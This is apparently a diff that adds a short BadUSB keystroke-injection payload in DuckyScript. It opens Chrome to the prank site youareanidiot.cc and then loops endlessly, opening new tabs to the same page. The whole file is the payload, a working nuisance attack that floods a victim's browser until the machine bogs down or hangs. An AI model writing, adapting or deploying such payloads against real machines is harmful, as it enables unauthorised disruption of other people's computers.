@@ -1,0 +1,16 @@
+
+GUI
+DELAY 750
+STRING chrome
+DELAY 200
+ENTER
+DELAY 25
+ALT d
+STRING https://www.youareanidiot.cc/lol.html?lang=en
+ENTER
+WHILE TRUE
+	CTRL t
+	ALT d
+	STRING https://www.youareanidiot.cc/lol.html?lang=en
+	ENTER
+END_WHILE
